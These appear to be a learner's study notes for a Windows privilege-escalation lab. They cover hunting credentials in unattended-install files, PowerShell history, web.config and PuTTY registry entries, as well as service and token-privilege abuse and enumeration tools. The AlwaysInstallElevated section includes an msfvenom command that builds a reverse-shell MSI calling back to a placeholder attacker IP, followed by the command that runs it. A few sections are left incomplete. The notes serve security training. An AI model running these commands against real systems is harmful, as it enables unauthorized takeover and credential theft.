## Task 1: Introduction

This lesson is about **getting higher privileges** on a **Windows machine** when we initially have only a normal user account.


Imagine you log into a Windows computer as: ``Normal User``, We can access our target files and folders, but we cannot perform administrative tasks.

The goal of Windows privilege escalation is: ``Normal User`` -> ``Find a weakness`` -> ``Higher privileges`` -> ``Administrator``


| Term                             | Easy Meaning                                                                            |
| -------------------------------- | --------------------------------------------------------------------------------------- |
| **Unprivileged User**            | A normal account with limited permissions.                                              |
| **Administrator**                | A highly privileged Windows account that can perform administrative tasks.              |
| **Privilege Escalation**         | Increasing your permissions from low privilege to higher privilege.                     |
| **Initial Foothold**             | The first access you obtain on the Windows machine.                                     |
| **Windows Privilege Escalation** | Finding weaknesses that let your current low-privileged account gain higher privileges. |

## Task 2: Windows Privilege Escalation

**Privilege escalation** means using the access we already have as User A to gain access to User B, usually by abusing a weakness in the Windows system.

Sample flow: ``User A (low privilege)`` -> ``Find weakness`` -> ``User B (higher privilege)`` -> ``Administrator``


Sometimes we may need to move through another normal account before reaching Administrator.


#### Common Weaknesses
| Weakness                            | Easy Meaning                                                                             |
| ----------------------------------- | ---------------------------------------------------------------------------------------- |
| **Service misconfiguration**        | A Windows service is configured with unsafe permissions or settings.                     |
| **Scheduled task misconfiguration** | A scheduled task can be modified or influenced by a low-privileged user.                 |
| **Excessive privileges**            | Your account has more permissions than it should have.                                   |
| **Vulnerable software**             | Installed software contains a vulnerability that can be exploited.                       |
| **Missing security patches**        | Windows or software is not updated and contains known security vulnerabilities.          |
| **Exposed credentials**             | Passwords or other credentials are left in files such as text documents or spreadsheets. |



### Windows Users

Windows mainly has **two normal types of users**:
| User Type          | Easy Meaning                                                                                                                 |
| ------------------ | ---------------------------------------------------------------------------------------------------------------------------- |
| **Administrators** | Users with high privileges. They can change system settings and access system files.                                         |
| **Standard Users** | Users with limited privileges. They normally cannot make important system changes and are mostly limited to their own files. |



#### Windows Groups
| User Type         | Group            |
| ----------------- | ---------------- |
| **Administrator** | `Administrators` |
| **Standard User** | `Users`          |


#### Special Built-in Accounts
| Account                  | Easy Meaning                                                                                                   |
| ------------------------ | -------------------------------------------------------------------------------------------------------------- |
| **SYSTEM / LocalSystem** | Windows' internal account with very high privileges and access to system files/resources.                      |
| **Local Service**        | Built-in account for Windows services with minimum privileges; uses anonymous network connections.             |
| **Network Service**      | Built-in account for Windows services with minimum privileges; uses the computer's credentials on the network. |

### Unattended Windows Installations

**Unattended installation means Windows is installed automatically on many computers without someone having to manually answer every setup question.

During this setup, an **administrator account** may be needed. Sometimes the username and password used during installation are left behind in configuration files.

#### locations
| File                                       | Easy Meaning                                                  |
| ------------------------------------------ | ------------------------------------------------------------- |
| `C:\Unattend.xml`                          | Possible Windows unattended-installation configuration file   |
| `C:\Windows\Panther\Unattend.xml`          | Another common location for the configuration                 |
| `C:\Windows\Panther\Unattend\Unattend.xml` | Another unattended-installation file location                 |
| `C:\Windows\system32\sysprep.inf`          | Sysprep configuration file that may contain setup information |
| `C:\Windows\system32\sysprep\sysprep.xml`  | Another Sysprep configuration file                            |



A file might contain something like:
````
<Credentials>
    <Username>Administrator</Username>
    <Domain>thm.local</Domain>
    <Password>MyPassword123</Password>
</Credentials>
````
That means the file contains:
| Field      | Meaning                  |
| ---------- | ------------------------ |
| `Username` | Account name             |
| `Domain`   | Windows domain           |
| `Password` | Password for the account |


**Unattended installation** = **automated Windows setup** → **configuration files may contain administrator credentials**.




### PowerShell History
PowerShell keeps a **history of commands** that a user has previously typed.

Sometimes a user may accidentally type a password directly into a command, so that password can remain in the PowerShell history file.

Where the history is stored:
````ps
C:\Users\<username>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
````

Example:

### IIS Configuration

**IIS (Internet Information Services)** is Microsoft's web server for Windows. Its website configuration is commonly stored in a file called ``web.config``.

Sometimes ``web.config`` can contain **database passwords or other credentials**.

Important locations:
````
C:\inetpub\wwwroot\web.config
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
````

To look for database connection strings:

### Retrieve Credentials from Software: PuTTY

**PuTTY** is an SSH client for Windows. Users can save connection settings such as IP addresses and usernames.

**PuTTY** does not save the SSH password itself, but its proxy configuration can contain authentication credentials.

The settings are stored in the Windows Registry.

Search for proxy-related entries with:
````
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
````
<img width="818" height="308" alt="image" src="https://github.com/user-attachments/assets/4d7d5124-5af9-4141-a09a-5fd16eafe40e" />


| Part                | Easy Meaning                               |
| ------------------- | ------------------------------------------ |
| `reg query`         | Read information from the Windows Registry |
| `HKEY_CURRENT_USER` | Registry settings for the current user     |
| `SimonTatham\PuTTY` | PuTTY's registry path                      |
| `/f "Proxy"`        | Search for entries containing `Proxy`      |
| `/s`                | Search subkeys too                         |

the saved PuTTY proxy credentials:
| Registry Value       | Result                | Meaning                               |
| -------------------- | --------------------- | ------------------------------------- |
| `ProxyHost`          | `proxy`               | Proxy hostname                        |
| `ProxyPort`          | `0x50`                | Port `80` in hexadecimal              |
| `ProxyUsername`      | `thom.smith`          | Saved username                        |
| `ProxyPassword`      | `CoolPass2021`        | **Saved password**                    |
| `ProxyTelnetCommand` | `connect %host %port` | Command used for the proxy connection |



> ``SimonTatham`` is **PuTTY's creator's name**. It is part of the registry path and is not the username whose credentials you are looking for.

### Scheduled Tasks

A **scheduled task** is a Windows task that automatically runs a program or script at a certain time or trigger.

The privilege-escalation opportunity appears when: ``Scheduled Task`` -> ``Runs a file as another user`` -> ``We can modify that file`` -> ``Our code runs as that user``.


Schedule task list:
````
schtasks /query /tn vulntask /fo list /v
````

### AlwaysInstallElevated
**AlwaysInstallElevated** is a Windows configuration that can make ``.msi`` installers run with administrator-level privileges, even when started by a normal user.



#### Check the registry

Run these from Command Prompt:
````
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
````
and:
````
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
````


Registry Location
| Registry Location        | What to Check             |
| ------------------------ | ------------------------- |
| `HKCU\...\Installer`     | Must be configured        |
| `HKLM\...\Installer`     | Must also be configured   |
| **Both enabled**         | Potentially exploitable   |
| **One missing/disabled** | This method will not work |




#### Create malicious MSI

````
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKING_MACHINE_IP LPORT=LOCAL_PORT -f msi -o malicious.msi
````

| Part                               | Meaning                   |
| ---------------------------------- | ------------------------- |
| `-p windows/x64/shell_reverse_tcp` | Reverse shell payload     |
| `LHOST`                            | Your attacking machine IP |
| `LPORT`                            | Port your listener uses   |
| `-f msi`                           | Create an MSI installer   |
| `-o malicious.msi`                 | Output filename           |


Then transfer ``malicious.msi`` to the Windows machine.




Run the MSI

On the Windows target:
````
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
````

## Task 5: Abusing Service Misconfiguration

### Windows Services
A **Windows service** is a program that runs in the background. Windows uses the Service Control Manager (SCM) to start, stop, and manage these services.

Important Path:
| Term                   | Easy Meaning                                                     |
| ---------------------- | ---------------------------------------------------------------- |
| **SCM**                | Windows component that manages services.                         |
| **Service executable** | The program that runs when the service starts.                   |
| **BINARY_PATH_NAME**   | Shows which executable/command the service runs.                 |
| **SERVICE_START_NAME** | Shows which user account runs the service.                       |
| **DACL**               | Controls who can start, stop, query, or reconfigure the service. |
| **Registry**           | Stores the configuration for Windows services.                   |
| **ImagePath**          | Registry value containing the service executable path.           |
| **ObjectName**         | Registry value containing the account used to run the service.   |
| **Security**           | Registry subkey that can store the service's DACL.               |


Check a Service:
````
sc qc apphostsvc
````

| -------------------- | -------------------------------------------- | -------------------------------------------------------- |
| `TYPE`               | `20 WIN32_SHARE_PROCESS`                     | Service runs in a shared process                         |
| `START_TYPE`         | `2 AUTO_START`                               | **Starts automatically when Windows starts**             |
| `ERROR_CONTROL`      | `1 NORMAL`                                   | Normal error handling if the service fails               |

### Unquoted Service Paths

An **unquoted service path** happens when a Windows service's executable path contains spaces but the path is not surrounded by quotation marks.

##### Normal path

This is safe: ``"C:\Program Files\RealVNC\VNC Server\vncserver.exe" -service``

The quotes clearly tell Windows: ``Execute this exact file``


##### Vulnerable-looking path

Example: ``C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe``

There are spaces, but there are no quotes.

Windows may interpret the path in stages:
````
C:\MyPrograms\Disk.exe
C:\MyPrograms\Disk Sorter.exe
C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe
````

| Check                                      | Meaning                                   |
| ------------------------------------------ | ----------------------------------------- |
| Path contains spaces                       | Potential issue                           |
| Path is surrounded by `" "`                | Properly quoted                           |
| Path contains spaces but no quotes         | **Unquoted service path**                 |
| Service runs as a privileged account       | More interesting for privilege escalation |
| Earlier directory is writable by your user | **Potentially exploitable**               |

### Windows Privileges

A **privilege** is a permission given to a Windows account to perform a specific system action.


For example, a privilege might allow an account to:
- Shut down the computer
- Change certain system settings
- Bypass some DACL-based access controls


Check Your Privileges
````
whoami /priv
````
This shows the privileges assigned to your current account.



Not every privilege is useful for privilege escalation. Focus on privileges that can potentially be abused to gain higher access.

| Term                      | Easy Meaning                                                                                      |
| ------------------------- | ------------------------------------------------------------------------------------------------- |
| **Privilege**             | Permission to perform a specific Windows system action                                            |
| `whoami /priv`            | Lists privileges assigned to your current account                                                 |
| **DACL**                  | Controls who can access or modify a Windows resource                                              |
| **Exploitable privilege** | A privilege that may provide a path to higher privileges                                          |
| **Priv2Admin**            | GitHub project listing Windows privileges that can potentially be abused for privilege escalation |


A complete list of available privileges on Windows systems is available: https://docs.microsoft.com/en-us/windows/win32/secauthz/privilege-constants

We can find a comprehensive list of exploitable privileges on the: https://github.com/gtworek/Priv2Admin

## Task 8: Tools of the Trade

Tools **automate enumeration** to help find possible privilege-escalation paths. They save time, but no tool is guaranteed to find everything.

| Tool                         | Easy Meaning                                                                     | Where It Runs          |
| ---------------------------- | -------------------------------------------------------------------------------- | ---------------------- |
| **WinPEAS**                  | Scans the Windows machine for possible privilege-escalation weaknesses.          | Target Windows machine |
| **PrivescCheck**             | PowerShell script that checks common Windows privilege-escalation opportunities. | Target Windows machine |
| **WES-NG**                   | Checks `systeminfo` output against known missing patches and vulnerabilities.    | Kali / AttackBox       |
| **Metasploit LPE Suggester** | Suggests possible local exploits when you already have a Meterpreter shell.      | Metasploit             |


### WinPEAS

Run:
````
winpeas.exe > outputfile.txt
````

| Part               | Meaning                        |
| ------------------ | ------------------------------ |
| `winpeas.exe`      | Run WinPEAS                    |
| `> outputfile.txt` | Save the long output to a file |

> **WinPEAS → Windows enumeration**.


### PrivescCheck

In PowerShell:
````ps
Set-ExecutionPolicy Bypass -Scope process -Force
````
Then load the script:
````ps
. .\PrivescCheck.ps1
````
Run it:
````ps
Invoke-PrivescCheck
````
| Command                   | Purpose                                          |
| ------------------------- | ------------------------------------------------ |
| `Set-ExecutionPolicy ...` | Temporarily bypass execution-policy restrictions |
| `. .\PrivescCheck.ps1`    | Load the script                                  |
| `Invoke-PrivescCheck`     | Run the privilege-escalation checks              |


> **PrivescCheck → PowerShell enumeration.**



### WES-NG

First update the database on Kali:
````
wes.py --update
````
On Windows, collect system information:
````
systeminfo > systeminfo.txt
````
Move ``systeminfo.txt`` to Kali, then run:
````
wes.py systeminfo.txt
````


> WES-NG → ``systeminfo`` → missing patches/vulnerabilities.



### Metasploit

If we already have a Meterpreter shell:
````
multi/recon/local_exploit_suggester
````
It searches for possible local exploits that could help with privilege escalation.

## Task 9: Conclusion


| Topic                                     | What You Learned                                                                                                    | Important Command / Skill                                                                            |
| ----------------------------------------- | ------------------------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------------- |
| **Privilege Escalation**                  | Move from a low-privileged Windows user to a higher-privileged account such as Administrator or SYSTEM.             | `whoami`                                                                                             |
| **Windows Users**                         | Administrators have high privileges; Standard Users have limited privileges; SYSTEM is highly privileged.           | `whoami`, `whoami /groups`                                                                           |
| **Credential Hunting**                    | Search for passwords in files, PowerShell history, saved credentials, IIS configuration, PuTTY, and other software. | `cmdkey /list`                                                                                       |
| **Unattended Installations**              | Installation files may contain administrator credentials.                                                           | Check `Unattend.xml`, `sysprep.xml`, etc.                                                            |
| **PowerShell History**                    | Previous commands may contain passwords accidentally entered by users.                                              | `type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt` |
| **Saved Credentials**                     | Windows can store credentials that may be usable with another account.                                              | `cmdkey /list`, `runas /savecred`                                                                    |
| **IIS**                                   | `web.config` may contain database or authentication credentials.                                                    | `findstr connectionString`                                                                           |
| **PuTTY**                                 | Registry entries may contain stored proxy credentials.                                                              | `reg query ... /f "Proxy" /s`                                                                        |
| **Scheduled Tasks**                       | A scheduled task can be abused when it runs a file you can modify.                                                  | `schtasks`, `icacls`                                                                                 |
| **AlwaysInstallElevated**                 | If both registry settings are enabled, MSI files can potentially run with elevated privileges.                      | `reg query HKCU...Installer`, `reg query HKLM...Installer`                                           |
| **Windows Services**                      | Check what executable a service runs, which account runs it, and who can control it.                                | `sc.exe qc <service>`                                                                                |
| **Service Executable Permissions**        | A writable service executable can potentially be replaced.                                                          | `icacls <executable>`                                                                                |
| **Unquoted Service Paths**                | Service paths containing spaces without quotes may allow executable path hijacking when a writable location exists. | `sc.exe qc <service>`                                                                                |
| **Insecure Service Permissions**          | A weak service DACL may allow a low-privileged user to change the service configuration.                            | `accesschk`, `sc.exe config`                                                                         |
| **Windows Privileges**                    | Account privileges can provide special abilities that may lead to escalation.                                       | `whoami /priv`                                                                                       |
| **SeBackup / SeRestore**                  | Can allow backup/restore access to protected files; SAM and SYSTEM can be copied for hash extraction.               | `reg save`                                                                                           |
| **SeTakeOwnership**                       | Allows taking ownership of objects and potentially changing their permissions.                                      | `takeown`, `icacls`                                                                                  |
| **SeImpersonate / SeAssignPrimaryToken**  | Can allow a compromised process to impersonate another user's token.                                                | `whoami /priv`                                                                                       |
| **Public Exploits / Vulnerable Software** | Unpatched software can contain CVEs that provide privilege escalation.                                              | `wmic product get name,version,vendor`                                                               |
| **Druva inSync**                          | Example of a vulnerable application where a path-traversal issue can lead to command execution as SYSTEM.           | Research the CVE and matching exploit                                                                |
| **Automated Enumeration**                 | Tools can quickly find misconfigurations and vulnerabilities, but can miss things.                                  | WinPEAS, PrivescCheck, WES-NG                                                                        |
| **WinPEAS**                               | Automated Windows privilege-escalation enumeration.                                                                 | `winpeas.exe > output.txt`                                                                           |
| **PrivescCheck**                          | PowerShell-based privilege-escalation enumeration.                                                                  | `Invoke-PrivescCheck`                                                                                |
| **WES-NG**                                | Uses `systeminfo` to identify missing patches and possible vulnerabilities.                                         | `wes.py systeminfo.txt`                                                                              |
| **Metasploit**                            | Can suggest local exploits from an existing Meterpreter session.                                                    | `multi/recon/local_exploit_suggester`                                                                |
